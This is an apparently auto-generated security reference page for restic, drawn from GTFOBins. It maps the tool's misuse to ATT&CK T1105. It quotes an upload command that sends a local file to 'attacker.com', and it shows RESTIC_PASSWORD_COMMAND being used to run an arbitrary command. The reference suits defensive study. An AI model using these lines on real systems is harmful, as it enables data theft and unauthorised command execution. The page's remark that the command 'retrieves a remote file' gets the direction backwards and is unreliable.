---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# restic

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `restic` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/restic` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

GTFOBins entry for restic covering command, shell, upload.

## Fast Retrieval

- Platform: `linux`
- Command page: [commands](../../commands/linux/restic.md)
- Source verification: [source record](../../sources/gtfobins/restic.md)

## Aliases

- `restic`

## Related ATT&CK Techniques

| Item | Relationship | Confidence | Evidence |
| --- | --- | --- | --- |
| [T1105 - Ingress Tool Transfer](../../attack/techniques/T1105-ingress-tool-transfer.md) | inferred | high | Command appears to retrieve a remote file: restic backup -r rest:http://attacker.com:12345/x /path/to/input-file |

## Source Verification

[source record](../../sources/gtfobins/restic.md)

## Evidence Excerpt

```text
_body: ''
_name: restic
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/restic
functions:
command:
- blind: true
code: RESTIC_PASSWORD_COMMAND='/path/to/command' restic backup
contexts:
```
